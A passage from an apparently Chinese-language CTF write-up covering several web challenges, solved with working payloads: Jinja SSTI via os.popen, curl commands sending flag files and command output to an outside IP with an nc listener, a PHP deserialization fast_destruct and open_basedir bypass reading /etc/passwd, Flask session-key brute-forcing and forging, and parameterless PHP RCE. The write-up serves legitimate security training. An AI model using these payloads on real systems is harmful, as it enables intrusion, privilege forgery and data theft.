class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span>sF<span class="hljs-variable">%DC</span><span class="hljs-variable">%91</span>f<span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%11</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%B6</span><span class="hljs-variable">%21</span><span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%F9</span><span class="hljs-variable">%CAg</span><span class="hljs-variable">%CC</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%A8Ly</span><span class="hljs-variable">%03</span><span class="hljs-variable">%0</span>C<span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%E2</span><span class="hljs-variable">%18</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%DFE</span><span class="hljs-variable">%C1O</span><span class="hljs-variable">%26</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%DC8</span><span class="hljs-variable">%E9j</span><span class="hljs-variable">%C2</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%BDr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EE<span class="hljs-variable">%BC</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%D2</span><span class="hljs-variable">%3</span>CW<span class="hljs-variable">%0</span>F<span class="hljs-variable">%EB</span><span class="hljs-variable">%14</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%BBU.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E31</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%807</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%1</span>F<span class="hljs-variable">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-variable">%DF</span><span class="hljs-variable">%93</span><span class="hljs-variable">%AC5</span><span class="hljs-variable">%00</span><span class="hljs-variable">%EBM</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%EC</span><span class="hljs-variable">%C1</span><span class="hljs-variable">%A8dy</span><span class="hljs-variable">%0</span>Cx<span class="hljs-variable">%2</span>Cv<span class="hljs-variable">%21</span>V<span class="hljs-variable">%60</span><span class="hljs-variable">%DD0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%91</span><span class="hljs-variable">%D0k</span><span class="hljs-variable">%D0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%BCF</span><span class="hljs-variable">%29</span><span class="hljs-variable">%B1</span><br></code></pre></td></tr></table></figure>

<p>POST传参，成功绕过。</p>
<p>最后一步是非法变量名，在php中[ . 空格 +都会被转为_而如果前面有一个[，就只有这个中括号会被转化为下划线，后面的这些字符就不会被转化，所以我们传入SYC[GEEK.2023&#x3D;Happy to see you!</p>
<p>成功拿到flag</p>
<p>SYC{RF8MgCYJC9diWlfaKq}</p>
<h2 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h2><p>这里考察curl的用法</p>
<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p>
<p>告诉了我们flag的位置和名字，我们使用-d参数，将flag发送到我们的服务器上，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">addr</span>=-d @/tmp/Syclover 47.108.89.135<br></code></pre></td></tr></table></figure>

<p>由于这里过滤了:所以我们不能添加端口，只能使用默认的80端口。</p>
<p>打开ssh链接服务器，监听80端口，在输入参数发包，就能在我们的服务器上接受到flag</p>
<h2 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h2><p>index.php啥也没有，查看源码，去看看&#x2F;hack</p>
<p>再看源码，提示我们传入klf参数，根据题目名字我们知道这里应该是ssti注入。</p>
<p>经过一系列尝试，发现无论输入什么都会是一个小黄脸嘲讽我们，那可能是ssit无回显。</p>
<p>找到万能payload</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;&#125;<span class="hljs-built_in">config</span>.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>把aaa换成我们的命令，本来想尝试反弹shell，发现目标机好像不支持反弹shell，那么虽然无回显，我们可以通过将回显写入一个文件，再通过curl命令读取文件发送到我们的服务器上，完成伪反弹shell。</p>
<p>首先</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;&#125;<span class="hljs-built_in">config</span>.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /app&gt;1.txt&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>然后我们读取1.txt</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">&#123;&#125;<span class="hljs-built_in">config</span>.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;curl -d @1.txt 47.108.89.135:2333&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>于此同时，我们在ssh上开启监听</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure>

<p>收到了回显，发现flag叫fl4gfl4gfl4g，那么</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"> &#123;&#125;config.__class__.__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;cat /app/fl4gfl4gfl4g</span><br><span class="hljs-string">&gt;1.txt&#x27;</span>).<span class="hljs-keyword">read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>重复上述步骤，拿到flag</p>
<p>SYC{wvDsEswyYrqSKJYJme}</p>
<h2 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h2><p>短小精焊的反序列化，题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;lover);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/lover/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>]);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;快来玩快来玩~&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p><strong>考点一：fast_destruct</strong></p>
<p>当一个PHP线程结束时，当前占用的所有内存空间都会被销毁，当前程序中的所有对象同样被销毁。</p>
<p>关键的eval函数被放在destruct方法里，正常析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。而这里程序多给了一句：<strong>throw new Error()</strong></p>
<p>这就导致__destruct方法无法被正常触发，所以我们得想办法提前触发__destruct</p>
<p>首先我们需要生成一个数组：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>改为<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>(),<span class="hljs-string">&#x27;awawaw&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>

<p>然后我们需要把生产后的序列化代码的第二个i后面的数字改成0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;awawaw&quot;</span>;&#125; <br>改成<br>a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;syc&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;lover&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;awawaw&quot;</span>;&#125; <br></code></pre></td></tr></table></figure>

<p>这样改后，php反序列化完第一个数组，也就是payload的时候，计数器-1就会提前触发__destruct</p>
<p><strong>考点二：绕过变量名过滤</strong></p>
<p>题目中把唯一的变量lover过滤了，给个文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/107998748#t10">https://blog.csdn.net/qq_45570082/article/details/107998748#t10</a> 我们可以考虑大写的S编码绕过。</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">S:</span>encoded <span class="hljs-type">string</span><br>可以将<span class="hljs-number">16</span>进制编码成字符，可以进行绕过特定字符<br></code></pre></td></tr></table></figure>

<p>那么，了解到‘l’的16进制编码是‘6c’  把s:5:”lover”改成S:5:”\6cover”就能成功绕过。</p>
<p><strong>考点三：Open_basedir绕过</strong></p>
<p>打入payload发现system函数被禁用，看了看phpinfo发现命令执行函数都被ban了。</p>
<p>发现有open_basedir        &#x2F;var&#x2F;www&#x2F;html&#x2F;</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>可以利用glob伪协议来读取文件目录。glob伪协议在筛选目录时不受open_basedir制约。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>现成的payload，去掉换行和回车，转义引号：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span> =<span class="hljs-string">&#x27;printf(\&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;\&#x27;, ini_get(\&#x27;open_basedir\&#x27;));$file_list = array();$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach($it as $f) &#123;$file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(&quot;glob:///.*&quot;);foreach($it as $f) &#123;$file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;echo &quot;&#123;$f&#125;&lt;br/&gt;&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>读取到了根目录：</p>
<p><strong>open_basedir : &#x2F;var&#x2F;www&#x2F;html&#x2F;</strong> </p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.<br>..<br>.dockerenv<br>bin<br>boot<br>dev<br>etc<br>f1ger<br>home<br>lib<br>lib64<br>media<br>mnt<br>opt<br><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">root</span><br>run<span class="hljs-title"></span><br><span class="hljs-title">sbin</span><br>srv<span class="hljs-title"></span><br><span class="hljs-title">sys</span><br>tmp<span class="hljs-title"></span><br><span class="hljs-title">usr</span><br>var<br></code></pre></td></tr></table></figure>

<p>再利用ini_set读取文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;tmpdir&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>现成的payload，去掉换行和回车，转义引号：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>=<span class="hljs-string">&#x27;mkdir(\&#x27;tmpdir\&#x27;);chdir(\&#x27;tmpdir\&#x27;);ini_set(\&#x27;open_basedir\&#x27;,\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);ini_set(\&#x27;open_basedir\&#x27;,\&#x27;/\&#x27;);$a=file_get_contents(\&#x27;/f1ger\&#x27;);var_dump($a);&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>打入题目获得flag：SYC{0ihPuPsdvLrLH2Owsm}</p>
<h2 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h2><p>给了一个pyc文件，需要反编译为python文件才能看到源码。</p>
<p><a target="_blank" rel="noopener" href="https://www.toolkk.com/tools/pyc-decomplie">https://www.toolkk.com/tools/pyc-decomplie</a></p>
<p>一顿代码审计之后发现了os.path.join()函数，这个函数有个漏洞，如果传入的参数以&#x2F;开头，就会不管当前的路径，直接以你传入的&#x2F;开头的路径为返回值。</p>
<p>比如，我们文章名为abc，当前目录是&#x2F;var&#x2F;www&#x2F;html&#x2F;article&#x2F;</p>
<p>我们的文章路径就会是&#x2F;var&#x2F;www&#x2F;html&#x2F;article&#x2F;abc</p>
<p>而如果文章名是&#x2F;abc   我们的文章路径就是&#x2F;abc</p>
<p>发现网站源码里有flag名字：f14444</p>
<p>那么我们只需要文章名为&#x2F;f14444即可直接打开flag：</p>
<p>SYC{KfxR42aRRGkRrW8YN8}</p>
<h2 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h2><p>这把必当教练了奥！</p>
<p>注册登录题首先想到修改flask token登录，先注册一个帐号，拿到现在的session</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJpc<span class="hljs-number">19</span>hZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>ZmFsc<span class="hljs-number">2</span>UsI<span class="hljs-name">m5</span>hbWUiOiIxIiwidX<span class="hljs-symbol">Nlcl9</span>pZCI<span class="hljs-number">6</span>M<span class="hljs-symbol">n0</span>.ZWHBvQ.YS<span class="hljs-attr">vcSY0</span>-B<span class="hljs-symbol">nAI37</span>sWrJyZAFaRUKk<br></code></pre></td></tr></table></figure>

<p>我们先要解密，才能修改数据，但是解密我们需要一个密钥。经过一顿找，发现在&#x2F;robots.txt里有东西&#x2F;3ysd8.html    打开后看源码</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">key是  app<span class="hljs-selector-class">.secret_key</span> = <span class="hljs-string">&#x27;wanbao&#x27;</span>+base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-built_in">str</span>(random<span class="hljs-selector-class">.randint</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>))<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)+<span class="hljs-string">&#x27;wanbao&#x27;</span><br></code></pre></td></tr></table></figure>

<p>拿到了源码，发现密钥是随机的，那我们需要遍历100个密钥，找到真正的密钥。</p>
<p>跑个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    secret_key = <span class="hljs-string">&#x27;wanbao&#x27;</span> + base64.b64encode(<span class="hljs-built_in">str</span>(i).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">&#x27;wanbao&#x27;</span><br>    <span class="hljs-built_in">print</span>(secret_key)<br></code></pre></td></tr></table></figure>

<p>然后出来了100个密钥，我们用github上的一个工具，flask-session-cookie-manager-master来测试每个密钥正不正确，100可以手测，但是脚本更快，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> ~/Downloads/book.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&quot;\r\n&quot;</span>;python ~/web/flask-session-cookie-manager-master/flask_session_cookie_manager3.py decode -s $(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&quot;\r\n&quot;</span>) -c <span class="hljs-string">&quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxIiwidXNlcl9pZCI6Mn0.ZWHBvQ.YSvcSY0-BnAI37sWrJyZAFaRUKk&quot;</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>

<p>这个脚本可以把book.txt里的100个密钥分别测试，如果能成功解密，就打印这个密钥。</p>
<p>经过测试，发现密钥为wanbaoOTg&#x3D;wanbao</p>
<p>而解密后的json数据是{‘is_admin’: False, ‘name’: ‘1’, ‘user_id’: 2}</p>
<p>显而易见，我们要把is_admin的值改为True，然后再通过密钥加密成session</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python ~/web/flask-session-cookie-manager-master/flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;wanbaoOTg=wanbao&#x27;</span> -t <span class="hljs-string">&quot;&#123;&#x27;is_admin&#x27;: True, &#x27;name&#x27;: &#x27;1&#x27;, &#x27;user_id&#x27;: 2&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<p>替换原来的cookie</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJpc<span class="hljs-number">19</span>hZ<span class="hljs-name">G1</span>pbiI<span class="hljs-number">6</span>dHJ<span class="hljs-number">1</span>ZSwibmFtZSI<span class="hljs-number">6</span>IjEiLCJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>lkIjoyfQ.ZWHFLQ.CvOT<span class="hljs-number">4</span>HS<span class="hljs-number">6</span>-TxGX_tsrjgDUwkvYEA<br></code></pre></td></tr></table></figure>

<p>刷新页面，发现自己成为了教练力！进入学员管理，拿到flag</p>
<p>SYC{k49Ba0dwVuBxT7rqGQ}</p>
<h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$var</span>))<br></code></pre></td></tr></table></figure>

<p>经典无参数rce</p>
<p>提示在当前目录下有flag，这样可以直接使用随机读取当前目录文件payload</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())))));</span><br></code></pre></td></tr></table></figure>

<p>这是随机读文件，多试几次就能读到flag：</p>
<p>SYC{szmkLiIQ3ujD1BBWvV}</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">(localeconv()</span></span>)是点<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span>扫描当前目录文件<br><span class="hljs-function"><span class="hljs-title">array_flip</span><span class="hljs-params">()</span></span>将读取当前目录的键和值进行反转<br>其中的键可以利用随机数函数<span class="hljs-built_in">array_rand</span>()，进行随机生成<br>然后利用<span class="hljs-built_in">readfile</span>()函数，读取该文件<br></code></pre></td></tr></table></figure>





<h2 id="雨"><a href="#雨" class="headerlink" title="雨"></a>雨</h2><p>让我们看&#x2F;source，说我们不是admin，应该也是修改cookie登录，我们先找到cookie</p>
